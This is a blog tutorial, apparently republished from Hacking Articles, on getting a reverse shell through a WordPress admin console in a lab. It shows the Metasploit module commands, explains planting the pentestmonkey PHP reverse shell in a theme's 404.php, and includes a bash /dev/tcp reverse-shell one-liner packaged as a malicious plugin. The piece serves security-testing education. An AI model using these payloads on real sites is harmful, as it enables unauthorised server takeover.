---
title: 'WordPress: Reverse Shell'
date: 2019-09-28T15:31:00+01:00
draft: false
---

This post is related to WordPress security testing to identify what will be possible procedure to exploit WordPress by compromising admin console. We have already setup WordPress in our local machine but if you want to learn WordPress installation and configuration then visit the link given below.

[https://www.hackingarticles.in/wordpress-penetration-testing-lab-setup-in-ubuntu/](https://www.hackingarticles.in/wordpress-penetration-testing-lab-setup-in-ubuntu/)

As we all know wpscan is a standalone tool for identifying vulnerable plugins and themes of WordPress, but in this post, we are not talking wpscan tutorial.

### **Table of Content**

*   Metasploit Framework
*   Injecting Malicious code in WP\_Theme
*   Upload Vulnerable WP\_Pulgin
*   Inject Malicious Plugin

**Requirement:**

Host machine: WordPress

Attacker machine: Kali Linux

WordPress Credential: admin: admin (in our case)

**Let’s begin!!**

As you can observe that I have access of WordPress admin console over the web browser, for obtaining web shell we need to exploit this CMS. There are multiple methods to exploit WordPress, let’s go for some operations.

![](https://i1.wp.com/1.bp.blogspot.com/-bsZ8Bg7Fedk/XY9py39i80I/AAAAAAAAguc/DFNS5_s2Y8AA-Ibt0RFBBgNMV4tQbOTsgCLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

### **Metasploit Framework**

The very first method that we have is Metasploit framework, this module takes an administrator username and password, logs into the admin panel, and uploads a payload packaged as a WordPress plugin. Because this is authenticated code execution by design, it should work on all versions of WordPress and as a result, it will give meterpreter session of the webserver.

```
msf > use exploit/unix/webapp/wp\_admin\_shell\_upload  
msf exploit(wp\_admin\_shell\_upload) > set USERNAME admin  
msf exploit(wp\_admin\_shell\_upload) > set PASSWORD admin  
msf exploit(wp\_admin\_shell\_upload) > set targeturi /wordpress  
msf exploit(wp\_admin\_shell\_upload) > exploit
```

Great!! It works wonderfully and you can see that we have owned the reverse connection of the web server via meterpreter session.

![](https://i1.wp.com/1.bp.blogspot.com/-HNtRFv5XyTI/XY9p1_35VDI/AAAAAAAAgu8/ZV5d-ALY2FMKJq9VHe7OA_T0Ay0kbmWFACLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

### **Injecting Malicious code in WP\_Theme**

There’s also a second technique that lets you spawn web server shells. If you have a username and password for the administrator, log in to the admin panel and inject malicious PHP code as a wordpress theme.

![](https://i1.wp.com/1.bp.blogspot.com/-b72LTfqKANI/XY9p2EvI34I/AAAAAAAAgvA/Bksfvh2k05M6bsfiGzqXSl8IzYsGjWJ_gCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

Login into WP\_dashboard and explore the appearance tab.

![](https://i0.wp.com/1.bp.blogspot.com/-vZzAzRUZ9Ik/XY9p2cQEwPI/AAAAAAAAgvE/La4GWPMyuLMpM70_T1UBAe8Si0tTP64qACLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

Now go for theme twenty fifteen chose the templet into 404.php

![](https://i2.wp.com/1.bp.blogspot.com/-ZXqEJvEiYvs/XY9p21rlGuI/AAAAAAAAgvI/XiX59wx7-y0-ZihVuZJURhBozZ74w1xJQCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

You see a text area for editing templet, inject your malicious php code here to obtain reverse connection of the webserver.

![](https://i1.wp.com/1.bp.blogspot.com/-tOuNYMAs_kk/XY9p2895zvI/AAAAAAAAgvM/XdS-pVVRr2UsvYupccxQwOAdzmuat0-igCLcBGAsYHQ/s1600/6.1.png?w=687&ssl=1)

![](https://i0.wp.com/1.bp.blogspot.com/-ZShjrkBxN3E/XY9p3BMuwwI/AAAAAAAAgvQ/byl9At5wONcKFJLfRE7Lw6ukiKfmJ3t6ACLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

Now, to proceed further, we used the reverse shell of PHP (By Penetstmonkey). And then we copied the above php-reverse-shell and paste it into the 404.php wordpress template as shown in the picture below. We have altered the IP address to our present IP address and entered any port you want and started the netcat listener to get the reverse connection.

![](https://i1.wp.com/1.bp.blogspot.com/-_FhFBjIxSq4/XY9p3tCWt0I/AAAAAAAAgvU/vGZXX_BzKZMWojjhGuxQ3LgGP_y6pfmuwCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

Update the file and browse the following URL to run the injected php code.

```
http://192.168.1.101/wordpress/wp-content/themes/twentyfifteen/404.php
```

![](https://i0.wp.com/1.bp.blogspot.com/-i_kambUrJAg/XY9p3otx-bI/AAAAAAAAgvY/4IfZWBMu1s8eNCrmzBx5EDALQTaC5NaEQCLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

you will have your session upon execution of 404.php file. Access netcat using the following command:

![](https://i0.wp.com/1.bp.blogspot.com/-OpXG-bkx174/XY9p4C-x98I/AAAAAAAAgvc/-6A3XUZkVjUu6poh2o5OR_nLigsBPGh8wCLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

### **Upload Vulnerable WP\_Pulgin**

Some time logon users do not own writable authorization to make modifications to the WordPress theme, so we choose “Inject WP pulgin malicious” as an alternative strategy to acquiring a web shell.

So, once you have access to a WordPress dashboard, you can attempt installing a malicious plugin. Here I’ve already downloaded the vulnerable plugin from exploit db.

Click **[here](https://www.exploit-db.com/exploits/36374)** to download the plugin for practice.

![](https://i0.wp.com/1.bp.blogspot.com/-Y_Aw7zSFJZs/XY9pymSjdvI/AAAAAAAAguY/FGyGEzlx9VIqNYyyra9r55IklNmwXwMQwCLcBGAsYHQ/s1600/10.png?w=687&ssl=1)

Since we have zip file for plugin and now it’s time to upload the plugin.

Dashboard > plugins > upload plugin

![](https://i0.wp.com/1.bp.blogspot.com/-FLhqB0I32Mg/XY9pyrlKWAI/AAAAAAAAguU/tofpIetTCv4Mho5y5D_sDuuokC7mDmKowCLcBGAsYHQ/s1600/11.png?w=687&ssl=1)

Browse the downloaded zip file as shown.

![](https://i1.wp.com/1.bp.blogspot.com/-KMumiwE2Tf0/XY9pzznEI4I/AAAAAAAAguk/BavBJP6plFo8NIpa38oWEKfx0jkOXv3HgCLcBGAsYHQ/s1600/12.png?w=687&ssl=1)

Once the package gets installed successfully, we need to activate the plugin.

![](https://i0.wp.com/1.bp.blogspot.com/-YrFg94Y2EZs/XY9pzydfLDI/AAAAAAAAgug/AjZyQ6Na8kUUmquJXwoapxcmr2-8nAMwQCLcBGAsYHQ/s1600/13.png?w=687&ssl=1)

When everything is well setup then go for exploiting. Since we have installed vulnerable plugin named “reflex-gallery” and it is easily exploitable.

You will get exploit for this vulnerability inside Metasploit framework and thus load the below module and execute the following command:

```
use exploit/unix/webapp/wp\_slideshowgallery\_upload  
set rhosts 192.168.1.101  
set targeturi /wordpress  
exploit
```

As the above commands are executed, you will have your meterpreter session. Just as portrayed in this article, there are multiple methods to exploit a WordPress platformed website.

![](https://i2.wp.com/1.bp.blogspot.com/-s6Yblqj-zQ8/XY9pz0qYWAI/AAAAAAAAguo/WXgEBKIB64Ian_RQWaltbEtdzCNpexKOwCLcBGAsYHQ/s1600/14.png?w=687&ssl=1)

### **Inject Malicious Plugin**

As you have seen above that we have uploaded the vulnerable plugin whose exploit is available. But this time we are going to inject our generated malicious plugin for obtain reverse shell.

This is quite simple as we have saved malicious code for reverse shell inside a php file named “revshell.php” and compressed the file in zip format.

```
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'")
```

![](https://i0.wp.com/1.bp.blogspot.com/-sCJnQv7G4fY/XY9p0XdgDDI/AAAAAAAAgus/s1T4wWokR9gm4bwtBQRS8raK13qYpvJbQCLcBGAsYHQ/s1600/15.png?w=687&ssl=1)

Again, repeat the same step as done above for uploading plugin “revshell.zip” file and start netcat listener to obtain the reverse connection of the target machine.

![](https://i1.wp.com/1.bp.blogspot.com/-2ykd8ysx224/XY9p1Gda6iI/AAAAAAAAguw/anlNNklrvIMWSJET0_ZVpnuxGKsqoQDIwCLcBGAsYHQ/s1600/16.png?w=687&ssl=1)

Once the package gets installed successfully, we need to activate the plugin.

![](https://i1.wp.com/1.bp.blogspot.com/-_NpeXhoG45M/XY9p1a8jOaI/AAAAAAAAgu0/AWEC1-OAdEkrds-gdtzk_B1MjfgS8vrYwCLcBGAsYHQ/s1600/17.png?w=687&ssl=1)

As soon as you will activate the plugin it will through the reverse connection as netcat session.

![](https://i0.wp.com/1.bp.blogspot.com/-iLqaIMWEnyY/XY9p1nxPjYI/AAAAAAAAgu4/Z1x2KiTOMuAqnENyTS9tanhBlu8-Z_YbACLcBGAsYHQ/s1600/18.png?w=687&ssl=1)

**Author**: Komal Singh is a Cyber Security Researcher and Technical Content Writer, she is completely enthusiastic pentester and Security Analyst at Ignite Technologies. Contact [**Here**](https://www.linkedin.com/in/komal-rajput-26b783131/)

The post [WordPress: Reverse Shell](https://www.hackingarticles.in/wordpress-reverse-shell/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/2nqYZq8